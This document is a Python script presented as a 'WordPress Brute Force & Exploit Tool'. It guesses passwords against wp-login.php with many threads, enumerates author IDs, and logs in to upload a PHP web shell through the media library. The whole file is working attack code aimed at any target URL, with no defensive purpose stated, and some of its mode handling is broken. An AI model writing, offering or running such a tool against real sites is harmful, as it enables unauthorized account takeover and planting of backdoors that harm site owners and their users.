import requests
import argparse
import threading
from queue import Queue
import sys

# Lock for synchronized console output
console_lock = threading.Lock()

# HTTP session for reuse
session = requests.Session()

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def banner():
    print("""
██████╗ ██╗   ██╗███████╗██████╗ ██████╗ ██╗███████╗
██╔══██╗██║   ██║██╔════╝██╔══██╗██╔══██╗██║██╔════╝
██████╔╝██║   ██║███████╗██║  ██║██║  ██║██║███████╗
██╔═══╝ ██║   ██║╚════██║██║  ██║██║  ██║██║╚════██║
██║     ╚██████╔╝███████║██████╔╝██████╔╝██║███████║
╚═╝      ╚═════╝ ╚══════╝╚═════╝ ╚═════╝ ╚═╝╚══════╝
    """)


def brute_force(target_url, username, password, timeout):
    """
    Attempt to log in to a WordPress site with a username and password.
    """
    login_url = f"{target_url}/wp-login.php"
    data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": f"{target_url}/wp-admin/",
        "testcookie": "1",
    }
    try:
        response = session.post(login_url, data=data, verify=False, timeout=timeout)
        if "wp-admin" in response.url or "dashboard" in response.text:
            with console_lock:
                print(f"[SUCCESS] Login successful for {username}:{password} on {target_url}")
            return True
    except Exception as e:
        with console_lock:
            print(f"[ERROR] {e}")
    return False


def enumerate_users(target_url, timeout):
    """
    Enumerate WordPress users by iterating through IDs.
    """
    print("[INFO] Starting user enumeration...")
    for user_id in range(1, 51):  # Customize range as needed
        try:
            response = session.get(f"{target_url}/?author={user_id}", verify=False, timeout=timeout)
            if response.status_code == 200:
                with console_lock:
                    print(f"[INFO] Found user ID {user_id} on {target_url}")
        except Exception as e:
            with console_lock:
                print(f"[ERROR] {e}")


def upload_shell(target_url, username, password, shell_path, timeout):
    """
    Log in and upload a PHP shell file to the WordPress media library.
    """
    if not brute_force(target_url, username, password, timeout):
        return

    # Log in successful, attempt to upload shell
    print(f"[INFO] Attempting shell upload to {target_url}...")
    upload_url = f"{target_url}/wp-admin/media-new.php"
    try:
        with open(shell_path, "rb") as shell_file:
            files = {"async-upload": shell_file}
            data = {"action": "upload-attachment"}
            response = session.post(upload_url, files=files, data=data, verify=False, timeout=timeout)
            if response.status_code == 200:
                print(f"[SUCCESS] Shell uploaded to {target_url}")
            else:
                print(f"[ERROR] Failed to upload shell to {target_url}")
    except Exception as e:
        print(f"[ERROR] {e}")


def worker(queue, target_url, timeout, username, password_list, mode, shell_path=None):
    """
    Worker thread for handling brute force or shell upload tasks.
    """
    while not queue.empty():
        password = queue.get()
        if mode == "brute":
            brute_force(target_url, username, password, timeout)
        elif mode == "shell":
            upload_shell(target_url, username, password, shell_path, timeout)
        queue.task_done()


def main():
    banner()
    parser = argparse.ArgumentParser(description="WordPress Brute Force & Exploit Tool")
    parser.add_argument("-T", "--target", required=True, help="Target WordPress site URL")
    parser.add_argument("-U", "--user", required=False, help="Username or file containing usernames")
    parser.add_argument("-P", "--passlist", required=False, help="File containing passwords")
    parser.add_argument("--enumerate", action="store_true", help="Enumerate users")
    parser.add_argument("--upload-shell", help="PHP shell file to upload")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP timeout in seconds (default: 10)")

    args = parser.parse_args()

    target_url = args.target.rstrip("/")
    timeout = args.timeout
    threads = args.threads
    mode = "brute" if args.passlist else "enumerate"

    if args.enumerate:
        enumerate_users(target_url, timeout)
        sys.exit(0)

    if args.user and args.passlist:
        # Multi-threaded brute force or shell upload
        with open(args.passlist, "r") as f:
            passwords = [line.strip() for line in f.readlines()]
        username = args.user
        queue = Queue()
        for password in passwords:
            queue.put(password)

        for _ in range(threads):
            t = threading.Thread(target=worker, args=(queue, target_url, timeout, username, passwords, mode, args.upload_shell))
            t.start()
        queue.join()
    elif args.upload_shell:
        upload_shell(target_url, args.user, args.passlist, args.upload_shell, timeout)
    else:
        print("[ERROR] Invalid arguments. Use -h for help.")


if __name__ == "__main__":
    main()
